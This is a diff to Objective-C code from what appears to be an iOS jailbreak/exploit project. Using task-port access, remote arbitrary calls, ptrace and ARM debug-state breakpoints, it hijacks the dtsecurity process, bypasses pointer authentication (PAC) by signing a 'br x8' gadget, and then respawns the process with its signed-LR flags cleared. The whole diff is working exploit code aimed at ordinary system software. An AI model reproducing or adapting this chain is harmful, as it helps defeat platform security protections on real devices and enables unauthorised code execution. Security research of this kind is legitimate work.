@@ -115,7 +115,7 @@ NSDictionary *getLaunchdStringOffsets(void) {
     }
     
     self.fakeBootstrapPort = setup_fake_bootstrap_server();
-    self.dtProc = [[ProcessContext alloc] initWithExceptionPortName:@"com.kdt.taskporthaxx.dtsecurity_exception_server"];
+    self.dtProc = [[ProcessContext alloc] initWithExceptionPortName:@"com.kdt.taskporthaxx.dtsecurity_donor_exception_server"];
     self.ubProc = [[ProcessContext alloc] initWithExceptionPortName:@"com.kdt.taskporthaxx.updatebrain_exception_server"];
     
     // preflight UpdateBrainService
@@ -238,7 +238,7 @@ NSDictionary *getLaunchdStringOffsets(void) {
             usleep(200000);
         }
         dtsecurityTaskPort = self.dtProc.taskPort;
-        bootstrap_register(bootstrap_port, "com.kdt.taskporthaxx.dtsecurity_task_port", dtsecurityTaskPort);
+        //bootstrap_register(bootstrap_port, "com.kdt.taskporthaxx.dtsecurity_task_port", dtsecurityTaskPort);
         if(!dtsecurityTaskPort) {
             printf("dtsecurity task port is null?\n");
             return;
@@ -284,10 +284,6 @@ NSDictionary *getLaunchdStringOffsets(void) {
         thread_t dtsecurity_thread = (thread_t)[self.ubProc read32:threads];
         printf("dtsecurity thread port: 0x%x\n", dtsecurity_thread);
         
-        // ptrace PT_THUPDATE
-//        ret = (kern_return_t)RemoteArbCall(self.ubProc, thread_suspend, dtsecurity_thread);
-//        printf("thread_suspend returned %d\n", ret);
-        
         // Get dtsecurity debug state
         arm_debug_state64_t *debug_state = (arm_debug_state64_t *)(map + 0x10);
         vm_address_t debug_state_count = map;
@@ -307,16 +303,13 @@ NSDictionary *getLaunchdStringOffsets(void) {
         printf("pacia: 0x%llx\n", pacia_inst);
         [self.ubProc write64:(uint64_t)&debug_state->__bvr[0] value:pacia_inst];
         [self.ubProc write64:(uint64_t)&debug_state->__bcr[0] value:0x1e5];
-//        [self.ubProc write64:(uint64_t)&debug_state->__bvr[1] value:pacia_inst+4];
-//        [self.ubProc write64:(uint64_t)&debug_state->__bcr[1] value:0x1e5];
         kr = (kern_return_t)RemoteArbCall(self.ubProc, thread_set_state, dtsecurity_thread, ARM_DEBUG_STATE64, (uint64_t)debug_state, ARM_DEBUG_STATE64_COUNT);
         if (kr != KERN_SUCCESS) {
             printf("thread_set_state(ARM_DEBUG_STATE64) failed: %s\n", mach_error_string(kr));
             return;
         }
         
-        
-        printf("#### NOW FOR THE PAC BYPASS ####\n");
+        printf("Bypassing PAC right now\n");
         
         // Clear SIGTRAP
         kr = (int)RemoteArbCall(self.ubProc, ptrace, PT_THUPDATE, self.dtProc.pid, dtsecurity_thread, 0);
@@ -326,11 +319,7 @@ NSDictionary *getLaunchdStringOffsets(void) {
         printf("Resume1:\n");
         printf("PC: 0x%llx\n", self.dtProc.newState->__pc);
         
-        // lastExceptionStateNum = 0x13 ???
-        RemoteArbCall(self.ubProc, thread_suspend, dtsecurity_thread);
-        kr = (int)RemoteArbCall(self.ubProc, ptrace, PT_THUPDATE, self.dtProc.pid, dtsecurity_thread, self.dtProc.lastExceptionStateNum);
-        RemoteArbCall(self.ubProc, thread_resume, dtsecurity_thread);
-        RemoteArbCall(self.ubProc, kill, self.dtProc.pid, SIGCONT);
+        // This shall step to pacia instruction
         self.dtProc.expectedLR = (uint64_t)-1;
         [self.dtProc resume];
         printf("Resume2:\n");
@@ -343,7 +332,7 @@ NSDictionary *getLaunchdStringOffsets(void) {
             return;
         }
         
-        printf("HERE WE GO WE HIT THE PACIA BREAKPOINT\n");
+        printf("We hit PACIA breakpoint!\n");
         self.dtProc.newState->__x[16] = brX8Address;
         self.dtProc.newState->__x[8] = 0x74810000AA000000; // 'pc' discriminator, 0xAA diversifier
         
@@ -360,15 +349,36 @@ NSDictionary *getLaunchdStringOffsets(void) {
         [self.dtProc resume];
         printf("Resume3:\n");
         printf("PC: 0x%llx\n", self.dtProc.newState->__pc);
-        printf("X16: 0x%llx\n", self.dtProc.newState->__x[16]);
         
+        brX8Address = self.dtProc.newState->__x[16];
+        printf("Signed Pointer: 0x%lx\n", brX8Address);
         
-#if 0
-        // debugserver
-        task_suspend
-        thread_convert_thread_state
-        thread_set_state hw single step
-#endif
+        // At this point we have corrupted x16 and x8 to sign br x8 gadget, it's quite complicated
+        // to continue from here as we need to have a signed pacia beforehand, then sign br x8 and
+        // set registers back to repair. Instead we will kill and replace dtsecurity.
+        printf("Cleaning up after PAC bypass\n");
+        RemoteArbCall(self.ubProc, ptrace, PT_KILL, self.dtProc.pid);
+        RemoteArbCall(self.ubProc, kill, self.dtProc.pid, SIGKILL);
+        [self.dtProc terminate];
+        [self.ubProc terminate];
+        self.ubProc = nil;
+        
+        self.dtProc = [[ProcessContext alloc] initWithExceptionPortName:@"com.kdt.taskporthaxx.dtsecurity_exception_server"];
+        [self.dtProc spawnProcess:@"dtsecurity" suspended:NO];
+        printf("Spawned dtsecurity with PID %d\n", self.dtProc.pid);
+        
+        // Change LR
+        while (!self.dtProc.newState) {
+#warning TODO: maybe another semaphore
+            usleep(200000);
+        }
+        self.dtProc.newState->__lr = 0xFFFFFF00;
+        self.dtProc.newState->__flags &= ~(__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR |
+                                           __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR |
+                                           __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC);
+        
+        RemoteArbCall(self.dtProc, getuid, 1);
+        RemoteArbCall(self.dtProc, sleep, 1);
         
 #if 0
         // Create a region which holds temp data (should we use stack instead?)
